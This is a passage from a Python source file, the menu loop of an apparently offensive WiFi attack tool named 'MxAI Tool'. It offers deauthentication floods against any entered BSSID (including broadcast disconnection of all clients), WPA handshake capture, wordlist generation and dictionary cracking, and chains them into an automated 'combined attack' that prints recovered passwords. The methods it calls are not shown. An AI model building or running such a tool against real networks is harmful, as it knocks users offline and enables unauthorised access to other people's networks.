                        print("\n📡 Enabling monitor mode...")
                        tool.set_monitor_mode(True)
                        
                        print(f"🚀 Sending {deauth_count} deauth packets...")
                        if tool.deauth_attack(target_bssid, client_mac, deauth_count):
                            print(f"✓ Deauth attack completed! Sent {deauth_count} packets.")
                            print("Devices should be disconnected from the network.")
                        else:
                            print("❌ Deauth attack failed.")
                            print("Make sure you have aircrack-ng installed and proper permissions.")
                        
                        print("\n📡 Disabling monitor mode...")
                        tool.set_monitor_mode(False)
                    
                    print("\nPress Enter to continue...")
                    input()
                
                elif attack_choice == "2":
                    print(f"\nStarting password attack on {target_essid}...")
                    print("This will capture handshake and attempt to crack password.")
                    
                    if tool.system != "Linux":
                        print("\n⚠ Password attack requires Linux with monitor mode!")
                        print("On Windows, this feature is not available.")
                        print("You can:")
                        print("  1. Use a Linux system with a compatible WiFi adapter")
                        print("  2. Try deauth attack (option 1) if on Linux")
                        print("\nReturning to menu...")
                    else:
                        # Linux system - proceed with attack
                        print("\n📡 Enabling monitor mode...")
                        if tool.set_monitor_mode(True):
                            print("✓ Monitor mode enabled")
                        else:
                            print("⚠ Could not enable monitor mode automatically")
                            print("You may need to enable it manually: sudo airmon-ng start <interface>")
                        
                        capture_file = f"handshake_{target_bssid.replace(':', '')}.cap"
                        
                        print(f"\n📶 Capturing handshake on channel {target_channel}...")
                        print("Tip: You need to wait for a device to connect to the network.")
                        print("     Or trigger connection by running deauth attack first.")
                        
                        confirm = input("\nStart capture? (y/n): ").lower()
                        if confirm == 'y':
                            print("\n🔍 Capturing... (This will take about 30 seconds)")
                            if tool.capture_handshake(target_bssid, target_channel, capture_file):
                                print(f"✓ Handshake captured: {capture_file}")
                                
                                print("\n🔓 Starting password cracking...")
                                print(f"Using wordlist: {tool.wordlist_path}")
                                print("This may take several minutes...")
                                
                                password = tool.crack_password(capture_file)
                                if password:
                                    print(f"\n🎉 SUCCESS! Password found: {password}")
                                    print(f"Network: {target_essid}")
                                    print(f"Password: {password}")
                                else:
                                    print("\n❌ Password not found in wordlist.")
                                    print("Try with a larger wordlist or different attack method.")
                            else:
                                print("❌ Failed to capture handshake.")
                                print("Make sure devices are connected to the network.")
                        else:
                            print("Capture cancelled.")
                        
                        # Disable monitor mode
                        print("\n📡 Disabling monitor mode...")
                        if tool.set_monitor_mode(False):
                            print("✓ Monitor mode disabled")
                    
                    print("\nPress Enter to continue...")
                    input()
                
                elif attack_choice == "3":
                    print(f"\n🔥 Starting combined attack on {target_essid}...")
                    
                    if tool.system != "Linux":
                        print("\n⚠ Combined attack requires Linux with monitor mode!")
                        print("On Windows, this feature is not available.")
                        print("\nReturning to menu...")
                    else:
                        print("\n📡 Enabling monitor mode...")
                        tool.set_monitor_mode(True)
                        
                        print("\n📡 Step 1: Deauth attack to trigger handshake...")
                        if tool.deauth_attack(target_bssid, "ff:ff:ff:ff:ff:ff", 5):
                            print("✓ Deauth packets sent. Waiting for reconnection...")
                            time.sleep(3)
                            
                            print("\n📶 Step 2: Capturing handshake...")
                            capture_file = f"handshake_{target_bssid.replace(':', '')}.cap"
                            
                            if tool.capture_handshake(target_bssid, target_channel, capture_file):
                                print(f"✓ Handshake captured: {capture_file}")
                                
                                print("\n🔓 Step 3: Cracking password...")
                                print(f"Using wordlist: {tool.wordlist_path}")
                                password = tool.crack_password(capture_file)
                                if password:
                                    print(f"\n🎉 SUCCESS! Password: {password}")
                                    print(f"Network: {target_essid}")
                                    print(f"Password: {password}")
                                else:
                                    print("❌ Password not found in wordlist.")
                            else:
                                print("❌ Handshake capture failed.")
                        else:
                            print("❌ Deauth attack failed.")
                        
                        print("\n📡 Disabling monitor mode...")
                        tool.set_monitor_mode(False)
                    
                    print("\nPress Enter to continue...")
                    input()
                
                elif attack_choice == "4":
                    print("Returning to menu...")
            
            elif choice == "2":
                if not tool.selected_interface:
                    print("Please run Auto Workflow (option 1) first to select interface")
                    continue
                
                print("Scanning for nearby WiFi networks...")
                networks = tool.scan_networks()
                if networks:
                    print(f"\nFound {len(networks)} network(s):")
                    for i, net in enumerate(networks, 1):
                        essid = net.get('essid', 'Hidden')
                        bssid = net.get('bssid', 'Unknown')
                        channel = net.get('channel', '?')
                        encryption = net.get('encryption', 'Unknown')
                        print(f"{i}. {essid} ({bssid}) - {encryption} - Ch{channel}")
                else:
                    print("No networks found")
            
            elif choice == "3":
                print("\n=== Manual Target Selection ===")
                if not tool.selected_interface:
                    print("Please select interface first (option 1)")
                    continue
                
                target_bssid = input("Enter target BSSID: ").strip()
                target_essid = input("Enter target ESSID (name): ").strip()
                target_channel = input("Enter channel: ").strip()
                
                print(f"\nTarget: {target_essid} ({target_bssid}) on channel {target_channel}")
                print("1. Deauth attack")
                print("2. Password attack")
                print("3. Both attacks")
                
                attack = input("Select attack: ").strip()
                
                if attack == "1":
                    count = input("Deauth packets (default 10): ").strip()
                    count = int(count) if count.isdigit() else 10
                    if tool.deauth_attack(target_bssid, "ff:ff:ff:ff:ff:ff", count):
                        print(f"Deauth attack sent {count} packets")
                    else:
                        print("Deauth attack failed")
                
                elif attack == "2":
                    if tool.system != "Linux":
                        print("Password attack requires Linux")
                        continue
                    
                    capture_file = f"handshake_{target_bssid.replace(':', '')}.cap"
                    if tool.capture_handshake(target_bssid, target_channel, capture_file):
                        print(f"Handshake captured: {capture_file}")
                        password = tool.crack_password(capture_file)
                        if password:
                            print(f"Password found: {password}")
                        else:
                            print("Password not found")
                    else:
                        print("Failed to capture handshake")
                
                elif attack == "3":
                    print("Combined attack...")
                    if tool.deauth_attack(target_bssid, "ff:ff:ff:ff:ff:ff", 5):
                        time.sleep(2)
                        capture_file = f"handshake_{target_bssid.replace(':', '')}.cap"
                        if tool.capture_handshake(target_bssid, target_channel, capture_file):
                            password = tool.crack_password(capture_file)
                            if password:
                                print(f"Password found: {password}")
                            else:
                                print("Password not found")
                        else:
                            print("Handshake capture failed")
                    else:
                        print("Deauth attack failed")
            
            elif choice == "4":
                print("\n=== Attack Type Selection ===")
                print("1. Deauthentication Attack Only")
                print("2. Password Cracking Attack Only")
                print("3. Combined Attack (Deauth + Crack)")
                print("4. Back")
                
                attack_type = input("Select: ").strip()
                if attack_type in ["1", "2", "3"]:
                    print(f"\nAttack type {attack_type} selected")
                    print("Run Auto Workflow (option 1) to select target")
            
            elif choice == "5":
                print("\n=== Manual Mode ===")
                print("1. Detect WiFi interfaces")
                print("2. Scan networks")
                print("3. Generate wordlist")
                print("4. Deauth attack")
                print("5. Capture handshake")
                print("6. Crack password")
                print("7. Back to main menu")
                
                manual_choice = input("Select: ").strip()
                
                if manual_choice == "1":
                    interfaces = tool.detect_wifi_interfaces()
                    if interfaces:
                        print(f"Found interfaces: {', '.join(interfaces)}")
                        tool.select_interface()
                    else:
                        print("No WiFi interfaces found")
                
                elif manual_choice == "2":
                    if not tool.selected_interface:
                        print("Please select interface first")
                        continue
                    networks = tool.scan_networks()
                    if networks:
                        print("\nDiscovered networks:")
                        for i, net in enumerate(networks, 1):
                            print(f"{i}. {net.get('essid', 'Unknown')} ({net.get('bssid', 'Unknown')})")
                    else:
                        print("No networks found")
                
                elif manual_choice == "3":
                    custom_words = input("Enter base words (comma separated) or press Enter for default: ")
                    if custom_words:
                        base_words = [w.strip() for w in custom_words.split(',')]
                    else:
                        base_words = None
                    filename = tool.generate_wordlist(base_words)
                    print(f"Wordlist generated: {filename}")
                
                elif manual_choice == "4":
                    if not tool.selected_interface:
                        print("Please select interface first")
                        continue
                    target = input("Enter target BSSID: ").strip()
                    client = input("Enter client MAC (or press Enter for broadcast): ").strip()
                    if not client:
                        client = "ff:ff:ff:ff:ff:ff"
                    try:
                        count = int(input("Number of deauth packets: "))
                    except:
                        count = 10
                    if tool.deauth_attack(target, client, count):
                        print(f"Deauth attack sent {count} packets")
                    else:
                        print("Deauth attack failed")
                
                elif manual_choice == "5":
                    if not tool.selected_interface:
                        print("Please select interface first")
                        continue
                    target = input("Enter target BSSID: ").strip()
                    channel = input("Enter channel: ").strip()
                    if tool.capture_handshake(target, channel):
                        print("Handshake capture started")
                    else:
                        print("Handshake capture failed")
                
                elif manual_choice == "6":
                    cap_file = input("Enter capture file (or press Enter for last): ").strip()
                    if not cap_file:
                        cap_file = None
                    wordlist = input("Enter wordlist file (or press Enter for generated): ").strip()
                    if not wordlist:
                        wordlist = None
                    password = tool.crack_password(cap_file, wordlist)
                    if password:
                        print(f"Password found: {password}")
                    else:
                        print("Password not found in wordlist")
            
            elif choice == "6":
                print("\n=== Monitor Mode Toggle (Linux Only) ===")
                if tool.system != "Linux":
                    print("⚠ Monitor mode is only available on Linux systems")
                    print("Windows does not support monitor mode for WiFi adapters")
                else:
                    if not tool.selected_interface:
                        print("Please select a WiFi interface first (option 1)")
                    else:
                        print(f"Current interface: {tool.selected_interface}")
                        print("\n1. Enable monitor mode")
                        print("2. Disable monitor mode")
                        print("3. Back to menu")
                        
                        mode_choice = input("\nSelect: ").strip()
                        
                        if mode_choice == "1":
                            print("\n📡 Enabling monitor mode...")
                            if tool.set_monitor_mode(True):
                                print("✓ Monitor mode enabled successfully")
                                print(f"Interface: {tool.selected_interface}mon")
                            else:
                                print("❌ Failed to enable monitor mode")
                                print("Make sure aircrack-ng is installed and you have root privileges")
                        
                        elif mode_choice == "2":
                            print("\n📡 Disabling monitor mode...")
                            if tool.set_monitor_mode(False):
                                print("✓ Monitor mode disabled successfully")
                                print(f"Interface: {tool.selected_interface}")
                            else:
                                print("❌ Failed to disable monitor mode")
                        
                        elif mode_choice == "3":
                            print("Returning to menu...")
                
                print("\nPress Enter to continue...")
                input()
            
            elif choice == "7":
                print("Exiting MxAI Tool")
                break
            
            else:
                print("Invalid choice")
        
        except KeyboardInterrupt:
            print("\nExiting...")
            break
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    if platform.system() == "Linux":
        try:
            if os.geteuid() != 0:
                print("Warning: Some features require root privileges on Linux")
        except AttributeError:
            pass
    main()